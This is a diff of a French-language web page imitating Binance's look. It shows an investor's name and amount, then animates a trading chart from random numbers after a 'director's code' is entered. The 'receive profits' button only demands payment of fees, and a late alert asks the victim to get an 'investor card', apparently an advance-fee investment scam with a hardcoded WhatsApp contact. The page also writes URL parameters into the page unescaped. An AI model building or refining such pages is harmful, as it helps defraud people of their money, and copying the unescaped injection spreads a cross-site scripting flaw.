@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Interface de transfert</title>
+    <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
     <style>
         * {
             margin: 0;
@@ -19,12 +20,12 @@
             height: 100%;
             background-image: url('./nano.png'); 
             background-size: cover;
-            z-index: -1;
-            filter: brightness(0.5);
+            z-index: -1; 
+            filter: brightness(0.5); 
         }
 
         body {
-            background-color: #14151a;
+            background-color: #14151a; /* Couleur principale de Binance */
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -32,13 +33,14 @@
             width: 100vw;
             min-height: 100vh;
             font-family: Arial, sans-serif;
-            color: #eaecef;
+            color: #eaecef; /* Texte clair */
         }
 
         .interface {
             text-align: center;
             padding: 20px;
             background-color: #1e2025;
+            color: #eaecef; 
             border-radius: 15px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
             margin-top: 20px;
@@ -47,39 +49,32 @@
             z-index: 1;
         }
 
-        .progress-container {
-            width: 100%;
-            background-color: #3a3d45;
-            border-radius: 10px;
-            margin-top: 20px;
-            height: 25px;
-            display: none;
-        }
-
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background-color: #f3ba2f;
-            border-radius: 10px;
+        .transfer-text {
+            font-size: 16px;
+            margin-bottom: 10px;
             text-align: center;
-            line-height: 25px;
-            font-weight: bold;
-            color: #14151a;
+            display: block;
         }
 
-        .button, .whatsapp-button {
+        .chart-container {
+            width: 100%;
+            max-width: 800px;
+            height: 300px;
+            margin: 20px auto;
+            position: relative;
+        }
+
+        .button {
+            background-color: #f3ba2f; /* Couleur jaune Binance */
+            color: #14151a; /* Texte foncé */
             border: none;
             padding: 10px 20px;
             border-radius: 5px;
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.2s;
+            display: inline-block;
             margin: 10px;
             font-weight: bold;
-        }
-
-        .button {
-            background-color: #f3ba2f;
-            color: #14151a;
         }
 
         .button:hover {
@@ -89,72 +84,132 @@
 
         .whatsapp-button {
             background-color: #25D366;
-            color: white;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-block;
+            margin: 10px;
         }
 
         .whatsapp-button:hover {
             background-color: #1DA851;
         }
+
+        .top-left-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 80px;
+            height: auto;
+            margin-top: 35px;
+        }
     </style>
 </head>
 <body>
-    <div id="registration-form" class="interface">
-        <h3>Informations de l'investisseur</h3>
-        <p><strong>Nom :</strong> <span id="info-nom"></span></p>
-        <p><strong>Prénom :</strong> <span id="info-prenom"></span></p>
-        <p><strong>Montant :</strong> <span id="info-montant"></span> FCFA</p>
-    </div>
-
     <div class="background-image"></div>
+    
+    <div class="interface" id="investor-info"></div>
+
     <div class="interface">   
         <div class="transfer-text" style="color:#f3ba2f" id="invest">En attente des fonds d'investissement</div>
-        <div class="progress-container" id="progress-container">
-            <div class="progress-bar" id="progress-bar">0%</div>
-        </div>
-        <br>
-        <p style="color: #f04747; font-weight: bold;" id="alert-msg"></p>  
+        <div class="chart-container" id="trading-chart"></div><br>
+        <div><p style="color: #f04747; font-weight: bold;" id="alert-msg"></p></div>  
+        
         <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
-        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/2250574090541', '_blank');">
+        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/+2250574090541', '_blank');">
         <input type="button" value="Recevoir mes bénéfices" class="button" id="btn-receive" style="display: none;">
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const params = new URLSearchParams(window.location.search);
-            
-            document.getElementById('info-nom').textContent = params.get("nom") || "Non renseigné";
-            document.getElementById('info-prenom').textContent = params.get("prenom") || "Non renseigné";
-            document.getElementById('info-montant').textContent = params.get("montant") || "0";
-        });
+        const urlParams = new URLSearchParams(window.location.search);
 
-        document.getElementById('btn-deblock').addEventListener('click', () => {
+        const investorName = urlParams.get('investorName') || "Non renseigné";
+        const transactionNumber = urlParams.get('transactionNumber') || "Non renseigné";
+        const network = urlParams.get('network') || "Non renseigné";
+        const totalAmount = urlParams.get('totalAmount') || "Non renseigné";
+
+        document.getElementById('investor-info').innerHTML = `
+            <div class="transfer-text"><strong>Nom de l'investisseur :</strong> ${investorName}</div>
+            <div class="transfer-text"><strong>Numéro de transaction :</strong> ${transactionNumber}</div>
+            <div class="transfer-text"><strong>Réseau utilisé :</strong> ${network}</div>
+            <div class="transfer-text"><strong>Montant total à recevoir :</strong> ${totalAmount}</div>
+        `;
+
+        let interval;
+        let timeRemaining = 60;
+
+        document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
             if (code2 === "7414") {
-                startLoading();
-                document.getElementById('invest').innerText = "En cours d'investissement...";
-                document.getElementById('btn-deblock').style.display = 'none';
-                document.getElementById('btn-receive').style.display = 'inline-block';
+                startInvestment();
+                document.querySelector('#invest').innerText = "En cours d'investissement...";
+                document.querySelector('#btn-deblock').style.display = 'none';
+                document.querySelector('#btn-receive').style.display = 'inline-block';
             } else {
                 alert("Code incorrect");
             }
         });
 
-        function startLoading() {
-            let progressBar = document.getElementById('progress-bar');
-            let progressContainer = document.getElementById('progress-container');
-            progressContainer.style.display = 'block';
-            let progress = 0;
+        document.querySelector('#btn-receive').addEventListener('click', () => {
+            alert('Veuillez payer les frais demandés');
+        });
 
-            let interval = setInterval(() => {
-                if (progress < 100) {
-                    progress += 1;
-                    progressBar.style.width = progress + '%';
-                    progressBar.innerText = progress + '%';
+        // Initialisation du graphique
+        const chartContainer = document.getElementById('trading-chart');
+        const chart = LightweightCharts.createChart(chartContainer, {
+            layout: {
+                backgroundColor: '#14151a',
+                textColor: '#f3ba2f',
+            },
+            grid: {
+                vertLines: { color: 'rgba(255, 255, 255, 0.1)' },
+                horzLines: { color: 'rgba(255, 255, 255, 0.1)' },
+            },
+            timeScale: { timeVisible: true },
+        });
+
+        const candleSeries = chart.addCandlestickSeries({
+            upColor: '#26a69a', // Vert pour les hausses
+            downColor: '#ef5350', // Rouge pour les baisses
+            borderVisible: false,
+            wickUpColor: '#26a69a',
+            wickDownColor: '#ef5350',
+        });
+
+        const data = [
+            { time: 1672531200, open: 100, high: 105, low: 95, close: 102 },
+            { time: 1672531260, open: 102, high: 107, low: 100, close: 105 },
+        ];
+        candleSeries.setData(data);
+
+        function startInvestment() {
+            interval = setInterval(() => {
+                if (timeRemaining > 0) {
+                    timeRemaining--;
+                    const lastCandle = data[data.length - 1];
+                    const newTime = lastCandle.time + 60;
+
+                    const newCandle = {
+                        time: newTime,
+                        open: lastCandle.close,
+                        high: lastCandle.close + Math.random() * 5,
+                        low: lastCandle.close - Math.random() * 5,
+                        close: lastCandle.close + (Math.random() > 0.5 ? Math.random() * 5 : -Math.random() * 5),
+                    };
+
+                    data.push(newCandle);
+                    candleSeries.update(newCandle);
+
+                    if (timeRemaining === 3) {
+                        document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez établir votre carte investisseur.';
+                    }
                 } else {
                     clearInterval(interval);
-                    document.getElementById('invest').innerText = "Investissement terminé !";
                 }
-            }, 100);
+            }, 1000);
         }
     </script>
 </body>
